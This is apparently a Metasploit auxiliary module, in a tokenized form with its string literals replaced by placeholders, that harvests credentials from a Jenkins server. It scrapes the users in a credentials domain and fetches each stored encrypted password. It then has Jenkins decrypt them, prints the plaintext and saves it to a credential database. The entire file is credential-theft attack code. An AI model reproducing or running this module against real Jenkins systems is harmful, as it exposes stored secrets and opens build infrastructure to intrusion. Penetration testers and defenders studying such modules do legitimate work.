require <str> require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <int> } , <str> = > MSF_LICENSE ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def get_jenkins_version uri = normalize_uri ( target_uri . path ) res = send_request_cgi ( { <str> = > uri } ) unless res fail_with ( Failure :: Unknown , <str> ) end html = res . get_html_document version_attribute = html . at ( <str> ) . attributes [ <str> ] version = version_attribute ? version_attribute . value : <str> version . scan ( <str> ) . flatten . first end def domain datastore [ <str> ] end def check version = get_jenkins_version vprint_status ( <str> version <str> ) if version return Exploit :: CheckCode :: Detected end Exploit :: CheckCode :: Safe end def get_users users = [ ] uri = normalize_uri ( target_uri . path , <str> , <str> , domain ) uri << <str> res = send_request_cgi ( { <str> = > uri } ) unless res fail_with ( Failure :: Unknown , <str> ) end html = res . get_html_document rows = html . search ( <str> ) rows . shift rows . each do | row | td = row . search ( <str> ) id = td [ <int> ] . at ( <str> ) . attributes [ <str> ] . value . scan ( <str> ) . flatten . first || <str> name = td [ <int> ] . text . scan ( <str> ) . flatten . first || <str> kind = td [ <int> ] . text desc = td [ <int> ] . text next unless <str> === kind users << { id : id , <str> : name , <str> : kind , <str> : desc , <str> : domain } end users end def get_encrypted_password ( id ) uri = normalize_uri ( target_uri . path , <str> , <str> , domain , <str> , id , <str> ) res = send_request_cgi ( { <str> = > uri } ) unless res fail_with ( Failure :: Unknown , <str> ) end html = res . get_html_document input = html . at ( <str> ) if input return input . attributes [ <str> ] . value else vprint_error ( <str> id <str> ) end nil end def decrypt ( encrypted_pass ) uri = normalize_uri ( target_uri , <str> ) res = send_request_cgi ( { <str> = > <str> , <str> = > uri , <str> = > { <str> = > <str> encrypted_pass <str> , <str> = > { <str> = > <str> encrypted_pass <str> } . to_json , <str> = > <str> } } ) unless res fail_with ( Failure :: Unknown , <str> ) end if <str> === res . body vprint_error ( <str> ) return nil end html = res . get_html_document result = html . at ( <str> ) if result decrypted_password = result . inner_text . scan ( <str> ) . flatten . first return decrypted_password else vprint_error ( <str> ) end nil end def descrypt_password ( id ) encrypted_pass = get_encrypted_password ( id ) decrypt ( encrypted_pass ) end def report_cred ( opts ) service_data = { <str> : rhost , <str> : rport , <str> : ssl ? <str> : <str> , <str> : <str> , <str> : myworkspace_id } credential_data = { <str> : <str> , <str> : fullname , <str> : opts [ <str> ] } . merge ( service_data ) if opts [ <str> ] credential_data . merge! ( <str> : opts [ <str> ] , <str> : <str> ) end login_data = { <str> : create_credential ( credential_data ) , <str> : Metasploit :: Model :: Login :: Status :: UNTRIED , <str> : opts [ <str> ] } . merge ( service_data ) create_credential_login ( login_data ) end def run users = get_users print_status ( <str> domain <str> users . length <str> ) users . each do | user_data | pass = descrypt_password ( user_data [ <str> ] ) if pass if user_data [ <str> ] . blank? print_good ( <str> user_data [ <str> ] <str> pass <str> ) else print_good ( <str> user_data [ <str> ] <str> pass <str> user_data [ <str> ] <str> ) end else print_status ( <str> user_data [ <str> ] <str> ) end report_cred ( <str> : user_data [ <str> ] , <str> : pass , <str> : user_data . inspect ) end end def print_status ( msg = <str> ) super ( <str> peer <str> msg <str> ) end def print_good ( msg = <str> ) super ( <str> peer <str> msg <str> ) end def print_error ( msg = <str> ) super ( <str> peer <str> msg <str> ) end end 
